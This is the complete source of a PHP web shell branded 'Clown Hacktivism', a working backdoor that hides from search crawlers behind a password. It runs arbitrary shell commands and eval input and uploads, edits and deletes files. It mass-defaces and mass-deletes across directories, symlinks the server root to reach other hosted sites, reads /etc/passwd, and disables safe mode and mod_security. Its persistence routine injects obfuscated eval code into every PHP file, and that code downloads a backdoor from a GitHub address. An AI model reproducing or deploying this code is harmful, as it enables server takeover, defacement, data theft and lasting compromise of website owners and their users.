<?php
session_start();
@error_reporting(0);
@set_time_limit(0);
if(version_compare(PHP_VERSION, '5.3.0', '<')) {
	@set_magic_quotes_runtime(0);
}
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
$password = "5af86d621d77a292c58da4d386ad9332"; 
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        @header('HTTP/1.0 404 Not Found');
        exit;
    }
}
function login_shell() {

if ($_GET["log"] == "in"){
    echo "<form method='post'>

<center>
<input type='password' name='password'>
</form>
</center>";

}
else{
   if(file_exists("index.html")){
       echo "<script>window.location='index.html';</script>";
   }elseif(file_exists("index.php")){
           echo "<script>window.location='index.php';</script>";
   } 
}
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if(empty($password) || (isset($_POST['password']) && (md5($_POST['password']) == $password)))
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
if(get_magic_quotes_gpc()) {
	function cht_ss($array) {
		return is_array($array) ? array_map('cht_ss', $array) : stripslashes($array);
	}
	$_POST = cht_ss($_POST);
}
echo "

<html>
<head>
<title>💩clown hacktivism</title>
    <style>
        body{
            font: 13px Iceland;
            color: green;
            background-color: black;
        }

        
        a.head {
            color: #DC0000;                    
            padding:4px 18px;
            letter-spacing:1px;
            border: 1px solid darkgreen;
            text-decoration: none;
        }
        a {
            color: green;
            text-decoration: none;            
        }
        a:hover {
            color: black;
            text-decoration: underline;
        }
        table,
        td,
        th {
            border: 1px solid transparent;
        }
        table {
            border-collapse: collapse;
            width: 100%;
        }
        th {
            height: 30px;
            text-align: center;
            padding: 10px;
            background-color: transparent;
            color: green;
        }
        td {
            color: red;
            text-align: left;
            vertical-align: left;
            padding: 10px;
        }
        a.head:hover,tr:hover {
            background-color: #1D1D1D;
            box-shadow:0 0 7px 5px red;
        }
        
        input[type=submit] {
	        width: 100px;
	        height: 35px;
	        color: red;
	        background: transparent;
	        border: 1px solid green;
	        text-align: center;
        }
        input {
        	width: 300px;
        	height: 35px;
        	color: red;
        	background: transparent;
        	border: 1px solid green;
        	margin-left: 20px;
        	text-align: center;
        }
        input:hover{      
          box-shadow:0 0 7px 5px green;
        }
        input[type=file]{
          width: 200px;
        	height: 20px;
        	color: green;
        	border: none; 
        }
        input[type=file]:hover{
            box-shadow: none;
        }  
        textarea {
        	color: white;
        	background: transparent;
        	border: 1px solid green;
        	margin-left: 20px;
        	text-align: left;
        	font-size: 10px;
        	size: 1px;
        	padding-top: 10px;
          padding-bottom: 10px;
          padding-left: 10px;
          padding-right: 10px;

        }
        input:hover,
        textarea:hover,
        table:hover{      
          box-shadow:0 0 7px 5px green;
        }
        li {
            display: inline;
            margin: 1px;
            padding: 0px;
        }
        pre.ex{
            padding-top: 10px;
            padding-bottom: 10px;
            padding-left: 10px;
            padding-right: 10px;
            border: 1px solid red;
            background-color: transparent;
        }
    .tooltip .tooltiptext {
        visibility: hidden;
        width: 250px;
        background-color: transparent;
        color: red;
        text-align: center;
        border-radius: 7px;
        padding: 10px 0;
        position: absolute;
        z-index: 1;
        border: 1px solid darkgreen;
    }
    .tooltip:hover .tooltiptext {
        visibility: visible;
    }
    .tooltip {
        border-bottom: 1px solid darkgreen;        
        position: relative;
        display: inline-block;
    }  
    </style>
</head>
<body>";
/////////////////////////warna
$act = $_GET["act"];
$dir = $_GET["dir"];
$path = halaman();
$shell_self = $_SERVER['PHP_SELF'];

function shell_color($text){
       return "<font color='red'>$text</font>";
   }
/////////////////////////warna


////////////halaman
function halaman() {
	if(isset($_GET['dir'])) {
		$dir = @str_replace("\\", "/", $_GET['dir']);
		chdir($dir);
	} else {
		$dir = @str_replace("\\", "/", @getcwd());
	}
	return $dir;
}
////////////////////end halaman


function exe($cmd){
	if(function_exists('system')) {
		@ob_start();
		@system($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	}
	elseif(function_exists('exec')) {
		@exec($cmd,$results);
		$buff = "";
		foreach($results as $result){
			$buff .= $result;
		}
		return $buff;
	}
	elseif(function_exists('passthru')) {
		@ob_start();
		@passthru($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	}
	elseif(function_exists('shell_exec')){
		$buff = @shell_exec($cmd);
		return $buff;
	}
}



/////////////////////function perm
function perm($data){
    
    $perms = fileperms ( $data ); 
    switch ( $perms & 0xF000 ) { 
        case 0xC000 : // socket 
            $info = 's' ; 
        break; 
        case 0xA000 : // symbolic link 
            $info = 'l' ; 
        break; 
        case 0x8000 : // regular 
            $info = 'r' ; 
        break; 
        case 0x6000 : // block special 
            $info = 'b' ; 
        break; 
        case 0x4000 : // directory 
            $info = 'd' ; 
        break; 
        case 0x2000 : // character special 
            $info = 'c' ; 
        break; 
        case 0x1000 : // FIFO pipe 
            $info = 'p' ; 
        break; 
        default: // unknown 
            $info = 'u' ; 
    } 

// Owner 
$info .= (( $perms & 0x0100 ) ? 'r' : '-' ); 
$info .= (( $perms & 0x0080 ) ? 'w' : '-' ); 
$info .= (( $perms & 0x0040 ) ? 
(( $perms & 0x0800 ) ? 's' : 'x' ) : 
(( $perms & 0x0800 ) ? 'S' : '-' )); 

// Group 
$info .= (( $perms & 0x0020 ) ? 'r' : '-' ); 
$info .= (( $perms & 0x0010 ) ? 'w' : '-' ); 
$info .= (( $perms & 0x0008 ) ? 
(( $perms & 0x0400 ) ? 's' : 'x' ) : 
(( $perms & 0x0400 ) ? 'S' : '-' )); 

// World 
$info .= (( $perms & 0x0004 ) ? 'r' : '-' ); 
$info .= (( $perms & 0x0002 ) ? 'w' : '-' ); 
$info .= (( $perms & 0x0001 ) ? 
(( $perms & 0x0200 ) ? 't' : 'x' ) : 
(( $perms & 0x0200 ) ? 'T' : '-' )); 

return $info ; 
}
///////////////////////////


///////////////////////user grup
function usergroup() {
	if(!function_exists('posix_getegid')) {
		$user['name'] 	= @get_current_user();
		$user['uid']  	= @getmyuid();
		$user['gid']  	= @getmygid();
		$user['group']	= "?";
	} else {
		$user['uid'] 	= @posix_getpwuid(posix_geteuid());
		$user['gid'] 	= @posix_getgrgid(posix_getegid());
		$user['name'] 	= $user['uid']['name'];
		$user['uid'] 	= $user['uid']['uid'];
		$user['group'] 	= $user['gid']['name'];
		$user['gid'] 	= $user['gid']['gid'];
	}
	return (object) $user;
}
////////////////////////end user grup


//////////////////////////lib ins
function lib_installed() {
	$lib[] = "MySQL: ".(@function_exists('mysql_connect') ? shell_color("ON") : shell_color("OFF"));
	$lib[] = "PostgreSQL: ".(@function_exists('pg_connect') ? shell_color("ON") : shell_color("OFF"));
	$lib[] = "Oracle: ".(@function_exists('pg_connect') ? shell_color("ON") : shell_color("OFF"));
	$lib[] = "cURL: ".(@function_exists('curl_version') ? shell_color("ON") : shell_color("OFF"));
	$lib[] = "WGET: ".(exe("wget --help") ? shell_color("ON") : shell_color("OFF"));
	$lib[] = "Perl: ".(exe("perl --help") ? shell_color("ON") : shell_color("OFF"));
	$lib[] = "Python: ".(exe("python --help") ? shell_color("ON") : shell_color("OFF"));
	return implode(" | ", $lib);
}
///////////////end lib

function up(){
    echo "<form method='get'>";
	       $user = shell_color(usergroup()->name.": ~ $");
			  echo $user,"";
			  echo "<input type='text' name='cmd' style='text-align:left;padding:10px;'>
			  <input type='submit' value='>>'>
			  </form>";  
if($_POST['upload']) {
				if(@copy($_FILES['file']['tmp_name'], halaman().DIRECTORY_SEPARATOR.$_FILES['file']['name']."")) {
					echo "<script>alert('"."Uploaded Succes! at".halaman().DIRECTORY_SEPARATOR.$_FILES['file']['name']."');</script>";
				} 
				else {
					echo "<script>alert('Failed to upload file!');</script>";
				}			 
}		
		echo "<br>
			  <form method='post' enctype='multipart/form-data'>
			  <input type='file' name='file'>
			  <input type='submit' value='upload' name='upload' style='width:70px;height:30px;'>
			  </form><br>";


}





////////////////////////
echo"<pre>";
$disable_functions = @ini_get('disable_functions');
$disable_functions = (!empty($disable_functions)) ? shell_color($disable_functions) : shell_color("NONE");
echo shell_color(php_uname())." • ".shell_color($_SERVER['SERVER_SOFTWARE'])."<br>Server IP: ".shell_color($_SERVER["HTTP_HOST"])." • Your IP: ".shell_color($_SERVER['REMOTE_ADDR']);
echo "<br>Safe Mode: ";
if(@ini_get(strtoupper("safe_mode")) === "ON") echo shell_color("ON");
else echo shell_color("OFF");
echo "<br>Disable Function: ".$disable_functions;
echo "<br>";
echo lib_installed();
echo "<br><br></pre>";
up();
echo "<ul>
<center><b>
<li><a class='head' href='?'> 🏠[ Home ]</a></li>
<li><a class='head' href='?dir=$path&act=mkdir'> [ +Make New Directory ]</a></li>
<li><a class='head' href='?dir=$path&act=makefile'>[ +Make New File ]</a></li>
<li><a class='head' href='?act=phpinfo'>[ PHP Info ]</a></li>
<li><a class='head' href='?act=mass'>[ Mass Deface ]</a></li>
<li><a class='head' href='?act=socket'>[ Socket Server ]</a></li>
<br><br>
<li><a class='head' href='?act=permanent'>[ Permanent ]</a></li>
<li><a class='head' href='?act=massdelete'>[ Mass Delete ]</a></li>
<li><a class='head' href='?act=symlink'>[ Symlink ]</a></li>
<li><a class='head' href='?act=jumping'>[ Jumping ]</a></li>
<li><a class='head' href='?act=eval'>[ Eval ]</a></li>
<li><a class='head' href='?act=byfunct'>[ Bypass function and safemode ]</a></li>
<br><br>
<li><a class='head' href='?act=logout'>[ Logout ]</a></li>
</b></center>
</ul><br>";
////////////////





//////////////////function home
function home(){

$act = $_GET["act"];
$dir = $_GET["dir"];
$path = halaman();
$shell_self = $_SERVER['PHP_SELF'];

if(!$dir){
    echo "Location: ".shell_color($path)."<br><br>";
}else{
    echo "Location: ".shell_color($dir)."<br><br>";
}

echo "<table border=1>
<tr>
<th style='border: 1px solid darkgreen;'>Name</th>
<th style='border: 1px solid darkgreen;'>Size</th>
<th style='border: 1px solid darkgreen;'>Last Modified</th>
<th style='border: 1px solid darkgreen;'>Permission</th>
<th style='border: 1px solid darkgreen;'>action</th>
</tr>";
$isi = @scandir(halaman());
foreach($isi as $data){
    $size = filesize($data)/1024;
    $size = round($size,3);
    $size = ($size > 1024) ? round($size/1024,2). "MB" : $size. "KB";
    $last = date('F d Y g:i:s', filemtime($data));
    $perms = perm($data);
    if(is_dir($data)){        
        if ($data == ".."){
            $folder[] = "<tr><td>🔝 <a href='$shell_self?dir=$path/$data'>[ UP ]</a></td>";
        }else $folder[] = "<tr><td>📁 <a href=\"$shell_self?dir=$path/$data\">[ $data ]</a></td>";
        $folder[] .= "<td><center> - </center></td>
        <td><center>$last</center></td>
        <td><center>$perms</center></td>";
        if($data == "." or $data == ".."){
             $folder[] .= "<td><center> - </center></td></tr>";
        }else{
             $folder[] .= "<td><center><a href='?dir=$path&folder=$dir/$data&act=rm'>rename</a></center></td></tr>";
        }
    }else{
        $file[] = "<tr><td>📄 <a href='$shell_self?dir=$path&file=$path/$data&act=open'>[ $data ]</a></td>
        <td><center>$size</center></td>
        <td><center>$last</center></td>
        <td><center>$perms</center></td>
        <td><center><a href='$shell_self?dir=$path&file=$path/$data&act=del'>delete</a> | <a href='$shell_self?dir=$path&file=$path/$data&act=rm'>rename</a></center></td></tr>";
    }    
}
for($i=0;$i<=count($folder);$i++){
    echo $folder[$i];
}
for($i=0;$i<=count($file);$i++){
    echo $file[$i];
}
echo "</table>";
}
//end home


if(!isset($_GET["act"]) and !isset($_GET["cmd"])) home();
$file = $_GET["file"];

 
//function for delete file
if ($_GET["act"] == "del"){ 
    echo "Are you sure want to delete '$file'?
    <form method='post'>
    <input type='hidden' value='ok' name='confirm'><br>
    <input type='submit' value='Yes'><br><br>
    </form>";
    if (isset($_POST["confirm"])){
            @unlink($file) or die("<script>alert('Failed to remove $php_errormsg');
            window.location='?dir=".halaman()."';</script>");           
            echo "<script>alert('File has removed !!');
            window.location='?dir=".halaman()."';</script>";
            
            }
}            
//end remove


//function for open file
if($_GET["act"] == "open"){
    $isi = htmlspecialchars(@file_get_contents($file));
    if(isset($_POST["save"])) {
                    $shell_file_hidden = $_POST["file_hidden"];
                    $shell_isi_baru = stripslashes($_POST['new']);
                    $fp = @fopen($shell_file_hidden, "w");
                    @fputs($fp, $shell_isi_baru);
                    @fclose($fp);
     }
       $form = "<form method='post' enctype='multipart/form-data'>
                <center>
                File Name : ".shell_color($file)."<br><br>
                <textarea style='width: 900px; height: 900px;' name='new'>$isi</textarea><br>
                <input type='hidden' name='file_hidden' value='$file'><br>
                <input type='submit' name='save' value='Save'>
                </center>
                </form>";
    if ($file != "" && !isset($_POST['save'])){
                echo $form;                            
    }else{
            echo "<script>
            alert('File has saved !!');
            window.location='".$shell_self."';</script>";
    }    
}
//end open

    
//function for rename
if($_GET["act"] == "rm"){
    echo "Enter new name: ";
    if(isset($_GET["file"])) $obj = $_GET["file"];
    elseif(isset($_GET["folder"])) $obj = $_GET["folder"];
    if(isset($_POST["submit"])) {
        $rename = @rename($obj,$_GET["dir"]."/".$_POST["newname"]);
        if($rename){
            echo "<script>
            alert('File has renamed !!');
            window.location='?dir=".halaman()."';</script>";
            
        }else {
            echo "<script>alert('Failed for rename !!');
            window.location='?dir=".halaman()."';</script>";
        }
    }else{
        echo "<form method='post'>
        <input name='newname' type='text' placeholder='New Name'>
        <input type='submit' value='Save' name='submit'>
        </form>";
    }   
}
//end rename


//function make new file
if ($_GET["act"] == "makefile"){
        $file = $_GET["file"];
        $name = "New_File";
        $fp = @fopen(halaman()."/".$name, "w");
        @fputs($fp, " ");
        @fclose($fp);
        if($fp){
            echo "<script>alert('File name: New_File !!');
            window.location='?dir=".halaman()."';</script>";
        }
    }   
//end make file


//make directory
if($_GET["act"] == "mkdir"){
    @mkdir(halaman()."/New_Folder");
    echo "<script>alert('Folder name: New_Folder !!');
    window.location='?dir=".halaman()."';</script>";
}
//end makedirectory


//exec function
if (isset($_GET["cmd"])){
    $cmd = $_GET["cmd"];
    $exe = exe($cmd);    
    $isi = htmlspecialchars($exe);
    echo "<pre class='ex'>".$isi."</pre>";
}
//end exec 



// fuction mass
function shell_mass(){
    function shell_bikin_file($shell_namafile,$shell_script){
        $shell_fp2 = @fopen($shell_namafile,"w");
        @fputs($shell_fp2,$shell_script);
    }
    function shell_buka_dir($shell_getcwd){
        if(is_writable($shell_getcwd)){
            $shell_nama = $_POST['nama'];
            $shell_script = $_POST['script'];
            $shell_a = @scandir("$shell_getcwd") or die("<script>alert('Error openining dir: ‘$php_errormsg’');</script> ");       
        foreach($shell_a as $shell_aa){
            if($shell_aa == "." | $shell_aa == ".."){
	          }
	          elseif(is_dir("$shell_getcwd/$shell_aa")){
                $shell_dir_baru = "$shell_getcwd/$shell_aa";
		            if(is_writable($shell_dir_baru)){
		                echo "[+]$shell_dir_baru/$shell_nama".shell_color("<-- succes..")."</font><br>";
		                $shell_create_file = shell_bikin_file("$shell_dir_baru/$shell_nama", "$shell_script");
		                $shell_baa = shell_buka_dir($shell_dir_baru);
            	   }else  echo "Dir  Not Writeable !!";
             }
         }	
    }
            else{
	                echo "Dir  Not Writeable !!";
            }
    }
    if($_POST){
        $shell_cwd = $_POST['dir'];
        $shell_coba = shell_buka_dir($shell_cwd);
        echo $shell_coba;
    }
    else{ 
          echo '<form method="post">
							<center>
							
							    Mass Defacer :
						
							<br><br>    
							<input type="text" name="dir" placeholder="Directory"><br><br>
							<input type="text" name="nama" placeholder="File Name"><br><br>
							<textarea rows="20" cols="80" name="script" placeholder="Script"></textarea><br><br>
							<br><input type="submit" value="Submit">
							</center>
							</form>
			</center>';
  }
}
if($_GET["act"] == "mass"){
    shell_mass();
}
//end function


//function massdelete
function shell_massdelete() {
    function shell_buka_dir($shell_getcwd){
        if(is_writable($shell_getcwd)){
            $shell_nama = $_POST['nama'];
            $shell_a = @scandir("$shell_getcwd");
        foreach($shell_a as $shell_aa){
            if($shell_aa == "." | $shell_aa == ".."){
	          }
	          elseif(is_dir("$shell_getcwd/$shell_aa")){
                $shell_dir_baru = "$shell_getcwd/$shell_aa";
		           $shell_delete_file = @unlink("$shell_dir_baru/$shell_nama");
		           if($shell_delete_file){
		                echo "$shell_dir_baru/$shell_nama".shell_color("<-- deleted..")."<br>";
		                $shell_baa = shell_buka_dir($shell_dir_baru);
            	   }else  echo "$shell_dir_baru/$shell_nama".shell_color("<--Permission denied: $php_errormsg !!")."<br>";
             }
         }	
    }
            else{
	                echo "Dir  Not Writeable !!";
            }
    }
    if($_POST){
        $shell_cwd = $_POST['dir'];
        $shell_coba = shell_buka_dir($shell_cwd);
        echo $shell_coba;
    }
    else{ 
          echo '<form method="post">
							<center>
							
							    Mass Delete :
							
							<br><br>    
							<input type="text" name="dir" placeholder="Directory"><br><br>
							<input type="text" name="nama" placeholder="File Name"><br><br>
							<br><input type="submit" value="Submit">
							</center>
							</form>
			</center>';
  }
}  
if($_GET["act"] == "massdelete"){
    shell_massdelete();
}
    
/////////'/////////////'//end delete

elseif($_GET["act"] == "logout"){
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
    print "<script>window.location='?';</script>";
}



///////////////////////////////
elseif($_GET['act'] == 'symlink'){	
echo '<form method="post">';
@set_time_limit(0);
@mkdir('cht',0777);
$htaccess  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$write =@fopen ('cht/.htaccess','w');
fwrite($write ,$htaccess);
@symlink('/','cht/root');
$filelocation = basename(__FILE__);
$read_named_conf = @file('/etc/named.conf');
if(!$read_named_conf)
{
echo "<script>alert('Cant access this file /etc/named.conf');</script>"; 
}
else
{
echo "<br><br><div><table border='1' bordercolor='#00ff00' width='500' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td>";
foreach($read_named_conf as $subject){
if(eregi('zone',$subject)){
preg_match_all('#zone "(.*)"#',$subject,$string);
flush();
if(strlen(trim($string[1][0])) >2){
$UID = posix_getpwuid(@fileowner('/etc/valiases/'.$string[1][0]));
$name = $UID['name'] ;
@symlink('/','cht/root');
$name   = $string[1][0];
$iran   = '\.ir';
$israel = '\.il';
$indo   = '\.id';
$sg12   = '\.sg';
$edu    = '\.edu';
$gov    = '\.gov';
$gose   = '\.go';
$gober  = '\.gob';
$mil1   = '\.mil';
$mil2   = '\.mi';
$malay	= '\.my';
$china	= '\.cn';
$japan	= '\.jp';
$austr	= '\.au';
$porn	= '\.xxx';
$as		= '\.uk';
$calfn	= '\.ca';

if (eregi("$iran",$string[1][0]) or eregi("$israel",$string[1][0]) or eregi("$indo",$string[1][0])or eregi("$sg12",$string[1][0]) or eregi ("$edu",$string[1][0]) or eregi ("$gov",$string[1][0])
or eregi ("$gose",$string[1][0]) or eregi("$gober",$string[1][0]) or eregi("$mil1",$string[1][0]) or eregi ("$mil2",$string[1][0])
or eregi ("$malay",$string[1][0]) or eregi("$china",$string[1][0]) or eregi("$japan",$string[1][0]) or eregi ("$austr",$string[1][0])
or eregi("$porn",$string[1][0]) or eregi("$as",$string[1][0]) or eregi ("$calfn",$string[1][0]))
{
$name = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$string[1][0].'</div>';
}
echo "
<tr>

<td>
<div class='dom'><a target='_blank' href=http://".$string[1][0].'/>'.$name.' </a> </div>
</td>

<td>
'.$UID['name']."
</td>

<td>
<a href='cht/root/home/".$UID['name']."/public_html' target='_blank'>Symlink </a>
</td>

</tr></div> ";
flush();
}
}
}
}

echo "</center></table>";   

}
////////////////////////eval
if ($_GET["act"] == "eval"){
    echo "<form method='post' action='$php_self'>
          <textarea name='eval' placeholder='script' style='width: 900px; height: 300px;'></textarea><br><br>
          <input type='submit' name='submit' value='Exec'></form><br><br><br>";
    if(isset($_POST["eval"])){
        echo "<pre class='ex'>";
        @eval($_POST["eval"]);
        echo "</pre>";
    }      
}
 
///////////////////
if($_GET["act"] == "byfunct"){
$byphp = "safe_mode = Off
disable_functions = None
safe_mode_gid = OFF
open_basedir = OFF
allow_url_fopen = On";
$byht = "<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
SecFilterCheckURLEncoding Off
SecFilterCheckUnicodeEncoding Off
</IfModule>";
@file_put_contents("php.ini",$byphp);
@file_put_contents(".htaccess",$byht);
echo "<script>alert('Disable Functions and Safemode Created'); hideAll();</script>";
die();
}

////////////////
elseif($_GET['act'] == 'jumping'){	
  echo '<form method="post">';
	echo "<table><tr>
	<td colspan=\"2\">"; 
	($sm = ini_get('safe_mode') == 0) ? 
	$sm = 'off': die("Error: Safe_mode = On</td></tr></table>  </div>"); 
	set_time_limit(0); 
	@$passwd = fopen('/etc/passwd','r'); 
	if (!$passwd) die ("<script>alert('Coudn‘t Read /etc/passwd');</script>");  
	$pub = array(); $users = array(); 
	$conf = array(); $i = 0; 
	while(!feof($passwd)){ $str = fgets($passwd); 
	if ($i > 100){ $pos = strpos($str,':'); $username = substr($str,0,$pos); $dirz = '/home/'.$username.'/public_html/'; if (($username != '')){ if (is_readable($dirz)){ array_push($users,$username); array_push($pub,$dirz); } } } $i++; } foreach ($users as $user){ echo '[OK] <a href="?dir=/home/'.$user.'/public_html">/home/'.$user.'/public_html/</a><br>'; } 
	 }
///////////////////
elseif ($_GET["act"] == "socket"){
    echo "<form method='post'>
              <center>
              <input type='text' name='port' style='width: 100px;height: 20px;' placeholder='Port'>
              <br><br>
              <textarea placeholder='Script' name='script' style='width: 400px; height: 200px;'></textarea>
              <br><input type='submit' value='Submit' name='submit'><br><br>
              <div class='tooltip'>Help Click me Baby..!!
                <span class='tooltiptext'>default port: 2810<br>
                  NB: if server  no Root.. Port > 1024</span>
              </div>                    
         </form></center>";
    if (isset($_POST["submit"])){
    set_time_limit (0);
    if(!empty($_POST['port']) && is_numeric($_POST['port'])) {
	    $port = $_POST['port'];
    } else {
	    $port = 2810;
    }
    $sock = socket_create(AF_INET, SOCK_STREAM, 0);
    @socket_bind($sock, 0, $port) or die('<script>alert("lnct_error: Failed to bind port");</script>');
    socket_listen($sock);
    $script = $_POST["script"];
    while ($client = socket_accept($sock)) {
	    $response = "HTTP/1.0 200 OK\r\n";
	    $response .= "Server: Dipkill-SSWP\r\n";
	    $response .= "Content-Type: text/html\r\n\r\n";
	    $response .= $script;
	    socket_write($client, $response);
	    socket_close($client);
    }
    socket_close($sock);}
}
if ($_GET['act'] == 'permanent'){
    $self = $_SERVER['PHP_SELF'];
    $nama = substr($self,1);
    $isi = scandir(halaman());
    $str = "
if (!file_exists('$nama')){
\$backdoor = file_get_contents('https://raw.githubusercontent.com/Dipkill/Dipkill-shell/master/encode.php');
    \$fp = fopen('$nama','w');
    fwrite(\$fp,\$backdoor);
    fclose(\$fp);
}";
    foreach($isi as $data){
        
        if (strstr($data,".php")){
            $fp = fopen($data,'a+');
            $gz = gzdeflate($str);
            $base64 = base64_encode($gz);
            fwrite($fp,"<?php eval(gzinflate(base64_decode('".$base64."')));?>");
            fclose($fp);
    }    
  }
}
    if ($_GET["act"] == "phpinfo") echo phpinfo();
echo "<br><br><b><center>
Copyright &copy;".shell_color("2018 Dipkill")." • ".shell_color("Clown Hacktivism")."</center></b>";

echo "</body>
</html>";
?>
